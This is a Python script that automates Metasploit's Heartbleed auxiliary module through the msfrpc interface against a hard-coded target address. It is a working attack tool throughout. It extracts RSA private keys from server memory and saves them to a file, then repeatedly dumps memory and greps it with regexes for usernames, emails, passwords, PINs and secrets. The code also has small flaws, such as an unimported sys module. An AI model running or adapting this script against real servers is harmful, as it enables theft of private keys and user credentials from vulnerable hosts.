import time
import re
try:
    import msfrpc
except:
    sys.exit("[!] Install the msfrpc library that can be found here: https://github.com/SpiderLabs/msfrpc.git")


def execute_command(client,command):
    done = False
    client.call('console.write',[console_id, command])
    time.sleep(1)
    while done != True:
        result = client.call('console.read',[console_id_int])
        if len(result['data']) > 1:
            if result['busy'] == True:
                time.sleep(1)
                continue
            else:
                console_output = result['data']
                #print(console_output)
                done = True
    return console_output

def find_info(regex,dump,verbose=False):
    matches =  re.findall(regex,dump,re.M)
    if verbose:
        for match in matches:
            print "[*] Matched data: " +match
    return matches

#Initializing msfrpc client and console
client = msfrpc.Msfrpc({'host':'127.0.0.1','port':55553,'ssl':False})
try:
    client.login('msf','test')
    print('[*] Connection to mdfrpc successful')
except:
    sys.exit("[!] Connection Failed")

try:
    result = client.call('console.create')
    print('[*] Console creation successful')
except:
    sys.exit("[!] Creation of console failed!")
console_id = result['id']
console_id_int = int(console_id)

#Initializing module
print '[*] Initializing auxiliary module'
execute_command(client,'use auxiliary/scanner/ssl/openssl_heartbleed\n')
execute_command(client,'set RHOSTS 192.168.181.132\n')

#Attempting to retrieve private key
print '[*] Attempting to retrieve private keys'
execute_command(client,'set ACTION KEYS\n')
out = execute_command(client,'run\n')
matches = find_info('-----BEGIN RSA PRIVATE KEY-----(?:.*?\n)*-----END RSA PRIVATE KEY-----',out,True)
f = open('heartbleedkeys.txt', 'wb')
for match in matches:
    f.write(match)
f.close()

#Attempting to usernames and passwords
print ("[*] Attempting to retrieve usernames and passwords")
execute_command(client,'set ACTION DUMP\n')
f = open('heartbleeddumps.txt', 'wb')
for i in range(0, 50):
    out = execute_command(client,'run\n')
    f.write(out)
    find_info('((?:mail|Email|login|logon|user|username)=.+?)(?:&|\.)',out,True)
    find_info('((?:pwd|pass|uid|uname|userid|PIN|pin|password|secret|Pass)=.+?)(?:&|\.)',out,True)
f.close()
print ("[*] Memory dump saved to heartbleeddumps.txt")

client.call('console.destroy',[console_id])
